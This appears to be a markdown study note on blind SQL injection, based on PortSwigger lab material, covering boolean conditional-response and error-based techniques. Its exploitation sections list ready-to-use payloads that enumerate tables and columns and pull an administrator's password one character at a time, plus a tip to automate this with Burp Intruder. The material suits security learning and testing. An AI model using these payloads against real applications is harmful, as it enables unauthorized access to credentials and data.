Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

## Exploiting blind SQL injection by triggering conditional responses
#### Example -
Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
```
…xyz' AND '1'='1
…xyz' AND '1'='2
```
- The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.

Next, we send the following input:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
We can continue this process to systematically determine the full password for the Administrator user.

> [!NOTE]
> The SUBSTRING function is called SUBSTR on some types of database. For more details, see the SQL injection cheat sheet.

### Queries that can be used for exploitation -

1. Discovering blind SQLi
```
xyz' AND '1'='1
xyz' AND '1'='2
```
2. Identifying table name
```
xyz' and (select table_name from information_schema.tables where table_name='users')='users
```
3. Identifying column name
```
xyz' and (select column_name from information_schema.columns where table_name='users' and column_name='username')='username
```
4. Identifying column value length
```
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

xyz' and (select length(password) from users where username='administrator')>'1

xyz' and (select length(password) from users where username='administrator')>1-- 
```
5. Identifying column value
```
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

xyz' and substring((select password from users where username='administrator'),1,1)='a
```

## Error-based SQL injection
Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:

- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses we looked at in the previous section.
- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones.

Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.

### Queries that can be used for exploitation -
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true:

- With the first input, the CASE expression evaluates to 'a', which does not cause any error.
- With the second input, it evaluates to 1/0, which causes a divide-by-zero error.
If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time:
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

> [!NOTE]
> There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the [SQL injection cheat sheet](https://github.com/DDarkDefender/Web-Applications/blob/main/PortSwigger/Injection%20(SQL%20and%20NoSQL)/SQL/CheatSheet.md).


> [!TIP]
> You can do this manually or use cluster bomb in Intruder.
